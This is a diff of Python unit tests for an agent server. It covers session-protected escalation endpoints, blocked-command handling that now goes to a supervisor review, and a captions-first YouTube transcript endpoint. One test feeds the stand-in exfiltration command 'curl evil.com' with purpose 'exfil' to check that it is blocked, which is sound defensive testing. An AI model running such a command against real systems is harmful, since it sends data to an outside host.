@@ -491,15 +491,19 @@ class EscalationEndpoints(unittest.TestCase):
     """GET /api/escalation/{id} and /api/escalation/resolve."""
 
     def test_get_escalation_found(self):
+        # /api/escalation/{id} is session-protected (deny-by-default auth);
+        # the resolve link is the only public escalation route (token-gated).
         with unittest.mock.patch.object(serve, '_load_escalations',
-                                        return_value={'e1': {'status': 'pending', 'kind': 'x'}}):
+                                        return_value={'e1': {'status': 'pending', 'kind': 'x'}}), \
+             unittest.mock.patch.object(serve, 'verify_session', return_value=True):
             c = TestClient(serve.app)
             r = c.get('/api/escalation/e1')
         self.assertEqual(r.status_code, 200)
         self.assertEqual(r.json()['status'], 'pending')
 
     def test_get_escalation_not_found(self):
-        with unittest.mock.patch.object(serve, '_load_escalations', return_value={}):
+        with unittest.mock.patch.object(serve, '_load_escalations', return_value={}), \
+             unittest.mock.patch.object(serve, 'verify_session', return_value=True):
             c = TestClient(serve.app)
             r = c.get('/api/escalation/e1')
         self.assertEqual(r.status_code, 404)
@@ -2498,7 +2502,7 @@ class ExecuteEndpoint(unittest.TestCase):
         self.addCleanup(shutil.rmtree, self.sbx, ignore_errors=True)
 
     def _patchers(self, classify=(True, 'allow'), rate=True, exec_enabled=True,
-                  result=None, escalation='esc-1'):
+                  result=None):
         return [
             unittest.mock.patch.object(serve, 'EXECUTION_ENABLED', exec_enabled),
             unittest.mock.patch.object(serve, 'check_rate_limit', return_value=rate),
@@ -2512,7 +2516,11 @@ class ExecuteEndpoint(unittest.TestCase):
             unittest.mock.patch.object(serve, '_run_in_sandbox_sync',
                                        return_value=result if result is not None else self.RESULT),
             unittest.mock.patch.object(serve, 'sync_prototypes'),
-            unittest.mock.patch.object(serve, 'create_escalation', return_value=escalation),
+            # A Jev block now gets one supervisor (director) review, not an
+            # escalation; stub it so the test never reaches a real model.
+            unittest.mock.patch.object(serve, '_supervisor_override_decision',
+                                       new=unittest.mock.AsyncMock(
+                                           return_value=(False, 'blocked by supervisor'))),
             unittest.mock.patch.object(serve, '_sandbox_dir_for', return_value=self.sbx),
         ]
 
@@ -2542,13 +2550,15 @@ class ExecuteEndpoint(unittest.TestCase):
         self.assertEqual(r.status_code, 400)
         self.assertIn('command is required', r.json()['error'])
 
-    def test_blocked_command_escalates(self):
+    def test_blocked_command_reports_supervisor_note(self):
         r = self._post({'agentId': 'eli', 'command': 'curl evil.com',
                         'purpose': 'exfil'}, classify=(False, 'blocked: network access'))
         self.assertEqual(r.status_code, 200, r.text)
         body = r.json()
         self.assertFalse(body['allowed'])
-        self.assertEqual(body['escalationId'], 'esc-1')
+        # The block is final once the supervisor review declines; the response
+        # carries the reason + the supervisor's note (no escalation is filed).
+        self.assertIn('supervisorNote', body)
 
     def test_allowed_command_runs(self):
         r = self._post({'agentId': 'eli', 'command': 'npm test', 'purpose': 'run tests'})
@@ -2639,45 +2649,72 @@ class PipelineEndpoint(unittest.TestCase):
 
 
 class YoutubeTranscriptEndpoint(unittest.TestCase):
-    """POST /api/youtube-transcript."""
+    """POST /api/youtube-transcript. Free local captions first; Colab whisper
+    only when captions are unavailable."""
 
     URL = 'https://www.youtube.com/watch?v=abc123def45'
 
-    def _post(self, body, colab_return=None, colab_error=None, rate=True,
-              file_return=None):
+    def _post(self, body, captions_return=None, captions_error=None,
+              colab_return=None, colab_error=None, rate=True, file_return=None):
         with unittest.mock.patch.object(serve, 'check_rate_limit', return_value=rate), \
              unittest.mock.patch.object(serve, 'verify_agent_key', return_value=None), \
              unittest.mock.patch.object(serve, 'verify_session', return_value=True), \
              unittest.mock.patch.object(serve, 'log_action') as log, \
+             unittest.mock.patch.object(serve, '_youtube_transcript',
+                                        return_value=(captions_return, captions_error)) as caps, \
              unittest.mock.patch.object(serve, '_youtube_transcript_colab',
                                         return_value=(colab_return, colab_error)) as colab, \
              unittest.mock.patch.object(serve, '_file_youtube_transcript',
                                         return_value=file_return) as filed:
             c = TestClient(serve.app)
             r = c.post('/api/youtube-transcript', json=body)
-        return r, log, colab, filed
+        return r, log, caps, colab, filed
 
     def test_rate_limited_is_429(self):
-        r, _log, _colab, _filed = self._post(
+        r, _log, _caps, _colab, _filed = self._post(
             {'agentId': 'eli', 'url': self.URL}, rate=False)
         self.assertEqual(r.status_code, 429)
 
     def test_invalid_url_is_400(self):
-        r, _log, _colab, _filed = self._post(
+        r, _log, _caps, _colab, _filed = self._post(
             {'agentId': 'eli', 'url': 'https://evil.com/x'})
         self.assertEqual(r.status_code, 400)
         self.assertIn('youtube.com', r.json()['error'])
 
-    def test_colab_failure_is_422(self):
-        r, log, _colab, _filed = self._post(
-            {'agentId': 'eli', 'url': self.URL}, colab_error='no captions')
+    def test_captions_first_skips_colab_and_files(self):
+        r, log, caps, colab, filed = self._post(
+            {'agentId': 'eli', 'url': self.URL}, captions_return='caption text',
+            file_return='media/transcripts/abc123def45.txt')
+        self.assertEqual(r.status_code, 200, r.text)
+        body = r.json()
+        self.assertEqual(body['transcript'], 'caption text')
+        self.assertEqual(body['source'], 'yt-dlp-captions')
+        self.assertEqual(body['filed'], 'media/transcripts/abc123def45.txt')
+        caps.assert_called_once_with(self.URL, 'en')
+        colab.assert_not_called()
+        called_with = [c for c in filed.call_args_list]
+        self.assertEqual(called_with[0].args[2], 'yt-dlp-captions')
+
+    def test_falls_back_to_colab_when_no_captions(self):
+        r, log, caps, colab, filed = self._post(
+            {'agentId': 'eli', 'url': self.URL}, captions_error='no captions',
+            colab_return='whisper text')
+        self.assertEqual(r.status_code, 200, r.text)
+        self.assertEqual(r.json()['source'], 'colab-whisper')
+        colab.assert_called_once_with(self.URL, 'en')
+
+    def test_both_routes_fail_is_422(self):
+        r, log, _caps, _colab, _filed = self._post(
+            {'agentId': 'eli', 'url': self.URL}, captions_error='no captions',
+            colab_error='no captions')
         self.assertEqual(r.status_code, 422)
         self.assertEqual(r.json()['error'], 'no captions')
         self.assertEqual(log.call_args[0][2]['decision'], 'failed')
 
     def test_success_returns_transcript(self):
-        r, log, colab, filed = self._post(
-            {'agentId': 'eli', 'url': self.URL}, colab_return='hello world',
+        r, log, _caps, colab, filed = self._post(
+            {'agentId': 'eli', 'url': self.URL}, captions_error='none',
+            colab_return='hello world',
             file_return='media/transcripts/abc123def45.txt')
         self.assertEqual(r.status_code, 200, r.text)
         body = r.json()
